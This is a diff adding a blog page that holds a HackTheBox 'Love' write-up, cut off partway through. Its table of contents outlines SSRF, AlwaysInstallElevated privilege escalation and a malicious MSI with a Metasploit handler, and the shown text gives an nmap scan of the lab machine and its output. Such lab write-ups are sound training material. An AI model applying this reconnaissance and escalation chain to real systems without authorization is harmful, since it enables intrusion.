@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackTheBox - Love Writeup | SH∆FIQ ∆IM∆N</title>
+<meta property="og:title" content="HackTheBox - Love Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="twitter:title" content="HackTheBox - Love Writeup | SH∆FIQ ∆IM∆N" />
+<meta itemprop="name" content="HackTheBox - Love Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="application-name" content="HackTheBox - Love Writeup | SH∆FIQ ∆IM∆N" />
+<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="http://example.com" />
+  <meta property="og:image" content="http://example.com" />
+  <meta name="twitter:image" content="http://example.com" />
+  <meta name="twitter:image:src" content="http://example.com" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2021-08-25T00:00:00Z />
+    <meta property="article:published_time" content=2021-08-25T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackTheBox - Love Writeup",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2021-08-25",
+        "description": "",
+        "wordCount":  1538 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2021-08-25",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "SH∆FIQ ∆IM∆N"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.119.0">
+
+    
+
+    <link rel="canonical" href="http://example.com/posts/htb/love/">
+    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://example.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://example.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackTheBox - Love Writeup</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2021-08-25T00:00:00&#43;00:00" itemprop="datePublished"> 25 Aug 2021 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#webpage-lovehtb">WebPage [love.htb]</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#webpage-staginglovehtb">WebPage [staging.love.htb]</a></li>
+        <li><a href="#ssrf">SSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#webpage-lovehtbadmin">WebPage [love.htb/admin]</a></li>
+      </ul>
+    </li>
+    <li><a href="#phoebe">Phoebe</a>
+      <ul>
+        <li><a href="#user-flag">User Flag</a></li>
+        <li><a href="#winpeas">WinPEAS</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a></li>
+      </ul>
+    </li>
+    <li><a href="#checking-the-register">Checking the register</a></li>
+    <li><a href="#generate-msi-files">Generate MSI files</a>
+      <ul>
+        <li><a href="#exploitmultihandler">exploit/multi/handler</a></li>
+        <li><a href="#execute-the-msi-file">Execute the MSI file</a></li>
+        <li><a href="#administrator-flag">Administrator Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>scan top 1000 ports</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">38</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">28</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">993</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">((</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">PHPSESSID</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">httponly</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">set</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Voting</span><span class="w"> </span><span class="k">System</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">PHP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">  </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">http</span><span class="w">     </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="w"> </span><span class="n">Forbidden</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">staging</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">ValentineCorp</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">m</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="k">in</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">18</span><span class="n">T14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">16</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">18</span><span class="n">T14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">16</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="n">time</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">http</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">Pro</span><span class="w"> </span><span class="mi">19042</span><span class="w"> </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="p">(</span><span class="n">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3306</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">mysql</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">DNSStatusRequestTCP</span><span class="p">,</span><span class="w"> </span><span class="n">FourOhFourRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HTTPOptions</span><span class="p">,</span><span class="w"> </span><span class="n">Help</span><span class="p">,</span><span class="w"> </span><span class="n">LDAPSearchReq</span><span class="p">,</span><span class="w"> </span><span class="n">LPDString</span><span class="p">,</span><span class="w"> </span><span class="n">NCP</span><span class="p">,</span><span class="w"> </span><span class="n">NotesRPC</span><span class="p">,</span><span class="w"> </span><span class="n">RPCCheck</span><span class="p">,</span><span class="w"> </span><span class="n">SMBProgNeg</span><span class="p">,</span><span class="w"> </span><span class="n">SSLSessionReq</span><span class="p">,</span><span class="w"> </span><span class="n">TLSSessionReq</span><span class="p">,</span><span class="w"> </span><span class="n">TerminalServerCookie</span><span class="p">,</span><span class="w"> </span><span class="n">X11Probe</span><span class="p">,</span><span class="w"> </span><span class="n">oracle</span><span class="o">-</span><span class="n">tns</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="k">Host</span><span class="w"> </span><span class="s1">&#39;10.10.14.7&#39;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">MariaDB</span><span class="w"> </span><span class="n">server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="w"> </span><span class="n">Forbidden</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">unrecognized</span><span class="w"> </span><span class="n">despite</span><span class="w"> </span><span class="n">returning</span><span class="w"> </span><span class="k">data</span><span class="p">.</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">service</span><span class="o">/</span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">submit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="n">cgi</span><span class="o">?</span><span class="k">new</span><span class="o">-</span><span class="n">service</span><span class="w"> </span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="o">-</span><span class="n">Port3306</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">8</span><span class="o">/</span><span class="mi">14</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">6116</span><span class="n">BF2A</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="k">unknown</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">HTTPOptions</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20n
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">R</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">PCCheck</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20a
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">DNSStatu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">sRequestTCP</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Help</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">SSLSessionReq</span><span class="p">,</span><span class="mi">4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="mi">9</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">TerminalServerCoo</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">kie</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allow
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">TLSSessionRe</span><span class="w">
